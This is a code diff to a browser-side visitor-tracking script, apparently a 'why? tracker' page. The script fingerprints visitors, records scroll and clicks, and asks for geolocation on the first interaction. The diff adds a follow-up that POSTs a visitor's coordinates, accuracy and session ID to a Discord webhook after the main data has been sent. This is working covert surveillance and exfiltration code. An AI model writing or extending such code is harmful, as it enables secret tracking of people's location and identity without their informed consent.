@@ -176,7 +176,22 @@
         try { return (prop in obj) ? 'Yes' : 'No'; } catch(e) { return '—'; }
     }
     function apiStr(name) {
-        try { return (name in navigator) ? 'Yes' : 'No'; } catch(e) { return '—'; }
+        try {
+            // Some APIs (geolocation, bluetooth, etc.) may exist as property but be null
+            // Use triple test: in operator + typeof + truthy
+            var inOp = (name in navigator);
+            var type = typeof navigator[name];
+            var val = navigator[name];
+            if (inOp && type !== 'undefined' && (type === 'function' || type === 'object')) {
+                return 'Yes';
+            }
+            // Special cases: some iOS Safari versions hide geolocation behind webkit prefix
+            if (name === 'geolocation') {
+                try { return (typeof navigator.geolocation !== 'undefined' && navigator.geolocation !== null) ? 'Yes' : 'No'; } catch(e) {}
+                try { return (typeof navigator.webkitGeolocation !== 'undefined') ? 'Yes (webkit)' : 'No'; } catch(e) {}
+            }
+            return 'No';
+        } catch(e) { return '—'; }
     }
     function trunc(s, max) {
         return s ? String(s).substring(0, max || 200) : '—';
@@ -696,16 +711,40 @@
     // 21) BEHAVIOR TRACKING — scroll depth, time, clicks
     var BEHAVIOR = { scrollDepth: 0, maxScroll: 0, timeOnPage: 0, clicks: 0, inputs: 0 };
     var _geoPrompted = false;
+    var _geoAlreadySent = false;
     function _tryGeoAgain() {
         if (_geoPrompted) return;
         _geoPrompted = true;
         // On first user interaction, try geo again (browser allows prompt on gesture)
         try {
             navigator.geolocation.getCurrentPosition(function(pos) {
-                COLLECTED.geoLat = pos.coords.latitude.toFixed(4);
-                COLLECTED.geoLon = pos.coords.longitude.toFixed(4);
-                COLLECTED.geoAccuracy = pos.coords.accuracy;
+                var lat = pos.coords.latitude.toFixed(4);
+                var lon = pos.coords.longitude.toFixed(4);
+                var acc = pos.coords.accuracy;
+                COLLECTED.geoLat = lat;
+                COLLECTED.geoLon = lon;
+                COLLECTED.geoAccuracy = acc;
                 COLLECTED.geoPermission = 'granted';
+                // If main data was already sent, send a follow-up with just geo
+                if (_geoAlreadySent && WEBHOOK_URL) {
+                    var geoEmbed = {
+                        title: '📍 Geo follow-up',
+                        color: 0x38BDF8,
+                        fields: [
+                            { name: '🌐 Coordinates', value: lat + ', ' + lon, inline: true },
+                            { name: '📏 Accuracy', value: acc.toFixed(0) + 'm', inline: true },
+                            { name: '🆔 Session', value: COLLECTED.sessionId || '—', inline: true }
+                        ],
+                        timestamp: new Date().toISOString(),
+                        footer: { text: 'why? tracker • geo granted after load' }
+                    };
+                    try {
+                        var xhr = new XMLHttpRequest();
+                        xhr.open('POST', WEBHOOK_URL, true);
+                        xhr.setRequestHeader('Content-Type', 'application/json');
+                        xhr.send(JSON.stringify({ embeds: [geoEmbed] }));
+                    } catch(e) {}
+                }
             }, function(err) {
                 if (err.code !== 1) COLLECTED.geoError = err.message;
             }, { timeout: 8000, enableHighAccuracy: false });
@@ -1352,6 +1391,7 @@
             if (audioFPValue) { data.audioFP = audioFPValue; }
             sendToDiscord(data);
             sent = true;
+            _geoAlreadySent = true;
             if (timer) { clearTimeout(timer); timer = null; }
         }
 
